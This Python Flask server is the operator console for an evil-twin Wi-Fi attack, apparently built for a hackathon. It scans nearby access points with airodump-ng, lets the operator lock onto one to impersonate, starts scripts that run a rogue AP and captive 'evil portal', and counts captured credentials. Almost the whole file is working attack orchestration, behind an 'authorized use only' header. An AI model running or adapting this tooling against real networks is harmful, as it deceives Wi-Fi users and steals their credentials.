#!/usr/bin/env python3
"""Evil-twin OPERATOR CONSOLE  (attacker-side orchestration).

⚠ AUTHORIZED USE ONLY — HackTech Lightning 2026. Use only against devices /
networks you own or are explicitly authorized to test.

One web panel that drives the whole chain, so a live run needs no terminal:
  * RECON  — scan the air and list nearby APs (BSSID / CH / ENC / PWR / SSID),
             just like airodump-ng, and pick which one to impersonate.
  * ATTACK — launch start-evil-twin.sh against the chosen SSID+channel.
  * WATCH  — stream every script's output into an in-panel console, show which
             components are up, and link to the live capture dashboard.

LIVE only: runs airodump-ng + start/stop-evil-twin.sh on the Kali box (needs
root + the AR9271 in monitor mode).

    sudo python3 ops_server.py            # live on :8080

Safety: only a fixed allow-list of actions can run; the SSID is passed to the
script via env/argv (never a shell string) and sanitized; channel is an int.
"""
import os, re, glob, time, threading, subprocess, json
from collections import deque
from flask import Flask, request, Response

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)                       # repo root (scripts live here)
PORT = int(os.environ.get("OPS_PORT", "8080"))
IFACE = os.environ.get("OPS_IFACE", "wlan1")     # AR9271 (ath9k_htc); NOT wlan0 (Intel net card)
SCAN_SECS = int(os.environ.get("OPS_SCAN_SECS", "8"))
LOG_DIR = "/tmp/evil-twin-logs"
CAPTURES = os.path.join(HERE, "captures.jsonl")

app = Flask(__name__)

# ---------------- shared state ----------------
_lock = threading.Lock()
CONSOLE = deque(maxlen=600)          # (ts, line) rolling operator console
TARGETS = []                         # scanned APs
TARGET = {}                          # chosen impersonation target
PROCS = {}                           # src -> Popen

def log(line, src="ops"):
    stamp = time.strftime("%H:%M:%S")
    with _lock:
        CONSOLE.append((stamp, f"{line}" if src == "ops" else f"[{src}] {line}"))
    print(f"{stamp} {line}", flush=True)


def sanitize_ssid(s):
    s = (s or "").replace("\n", " ").replace("\r", " ")
    s = "".join(ch for ch in s if ch.isprintable())
    return s[:32]


def sanitize_channel(c):
    try:
        return max(1, min(14, int(c)))
    except (TypeError, ValueError):
        return 6


# ============================================================ engine ====

def run_bg(cmd, src, env=None):
    """Launch a subprocess, stream its stdout into the console under [src]."""
    log(f"$ {' '.join(cmd)}", src)
    e = dict(os.environ)
    if env:
        e.update(env)
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                         text=True, bufsize=1, cwd=ROOT, env=e)
    PROCS[src] = p

    def pump():
        for line in p.stdout:
            log(line.rstrip(), src)
        log(f"(process exited: {p.returncode})", src)
    threading.Thread(target=pump, daemon=True).start()
    return p


def proc_running(src):
    p = PROCS.get(src)
    return bool(p and p.poll() is None)


def parse_airodump_csv(path):
    aps = []
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            text = f.read()
    except OSError:
        return aps
    section = text.split("Station MAC")[0]
    for line in section.splitlines()[1:]:
        c = [x.strip() for x in line.split(",")]
        if len(c) < 14 or not re.match(r"^([0-9A-Fa-f]{2}:){5}", c[0]):
            continue
        aps.append({"bssid": c[0], "channel": _int(c[3]), "enc": c[5] or "OPEN",
                    "cipher": c[6], "power": _int(c[8]), "ssid": c[13] or "<hidden>"})
    return aps


def _int(s):
    try:
        return int(s)
    except (TypeError, ValueError):
        return None


def real_scan():
    with _lock:
        TARGETS.clear()
    log(f"enabling monitor on {IFACE} + scanning the air…")
    # NM-safe: release only this adapter, so wlan0's internet stays up (no check kill).
    subprocess.call(["bash", "-c", f"nmcli device set {IFACE} managed no >/dev/null 2>&1 || true"])
    subprocess.call(["bash", "-c",
                     f"ip link set {IFACE} down; iw dev {IFACE} set type monitor; "
                     f"ip link set {IFACE} up"])
    os.makedirs(LOG_DIR, exist_ok=True)
    prefix = os.path.join(LOG_DIR, "ops-scan")
    for old in glob.glob(prefix + "*"):
        try: os.remove(old)
        except OSError: pass
    run_bg(["airodump-ng", "--output-format", "csv", "-w", prefix, IFACE], "scan")
    time.sleep(SCAN_SECS)
    p = PROCS.get("scan")
    if p and p.poll() is None:
        p.terminate()
    csvs = sorted(glob.glob(prefix + "*.csv"))
    aps = parse_airodump_csv(csvs[-1]) if csvs else []
    aps = [a for a in aps if a["ssid"] and a["ssid"] != "<hidden>"]
    aps.sort(key=lambda a: (a["power"] is None, -(a["power"] or -999)))
    with _lock:
        TARGETS.extend(aps)
    log(f"scan complete — {len(aps)} networks found. pick a target to impersonate.")


def real_launch():
    ssid, ch = TARGET.get("ssid"), TARGET.get("channel")
    log(f"launching evil twin of \"{ssid}\" on channel {ch}…")
    run_bg(["bash", os.path.join(ROOT, "start-evil-twin.sh")], "attack",
           env={"ET_SSID": ssid, "ET_CHANNEL": str(ch), "ET_IFACE": IFACE})


def real_stop():
    log("tearing everything down…")
    run_bg(["bash", os.path.join(ROOT, "stop-evil-twin.sh")], "attack")


# ============================================================ actions ====

def status():
    return {"target": TARGET,
            "monitor": _monitor_up(), "scanning": proc_running("scan"),
            "airbase": _pgrep("airbase-ng"), "dnsmasq": _pgrep("dnsmasq -C"),
            "portal": _pgrep("evil_portal.py"), "captures": _capture_count()}


def _capture_count():
    try:
        with open(CAPTURES) as f:
            return sum(1 for ln in f if ln.strip())
    except OSError:
        return 0


def _pgrep(pat):
    return subprocess.call(["pgrep", "-f", pat], stdout=subprocess.DEVNULL) == 0


def _monitor_up():
    try:
        return "Mode:Monitor" in subprocess.check_output(["iwconfig"], text=True,
                                                          stderr=subprocess.DEVNULL)
    except Exception:
        return False


ACTIONS = {"scan", "launch", "stop"}


def dispatch(action):
    if action == "scan":
        threading.Thread(target=real_scan, daemon=True).start()
    elif action == "launch":
        if not TARGET:
            log("!! no target selected — pick one from the recon table first.")
            return False
        threading.Thread(target=real_launch, daemon=True).start()
    elif action == "stop":
        real_stop()
    return True


# ============================================================ routes ====

@app.route("/")
def index():
    with open(os.path.join(HERE, "ops.html")) as f:
        return Response(f.read(), mimetype="text/html")


@app.route("/api/status")
def api_status():
    with _lock:
        targets = list(TARGETS)
    return Response(json.dumps({**status(), "targets": targets, "mode": "LIVE"}),
                    mimetype="application/json")


@app.route("/api/logs")
def api_logs():
    with _lock:
        lines = [f"{t}  {l}" for t, l in CONSOLE]
    return Response("\n".join(lines), mimetype="text/plain")


@app.route("/api/select", methods=["POST"])
def api_select():
    bssid = (request.json or {}).get("bssid")
    with _lock:
        match = next((t for t in TARGETS if t["bssid"] == bssid), None)
    if not match:
        return Response(json.dumps({"ok": False}), mimetype="application/json")
    TARGET.clear()
    TARGET.update({"ssid": sanitize_ssid(match["ssid"]),
                   "channel": sanitize_channel(match["channel"]),
                   "bssid": match["bssid"], "enc": match["enc"]})
    log(f"🎯 target locked: \"{TARGET['ssid']}\"  ch{TARGET['channel']}  "
        f"({match['bssid']}, {match['enc']})")
    return Response(json.dumps({"ok": True, "target": TARGET}), mimetype="application/json")


@app.route("/api/action", methods=["POST"])
def api_action():
    action = (request.json or {}).get("action")
    if action not in ACTIONS:
        return Response(json.dumps({"ok": False, "error": "unknown action"}),
                        status=400, mimetype="application/json")
    ok = dispatch(action)
    return Response(json.dumps({"ok": ok}), mimetype="application/json")


if __name__ == "__main__":
    log(f"operator console up on :{PORT}  mode=LIVE")
    app.run(host="0.0.0.0", port=PORT, threaded=True)
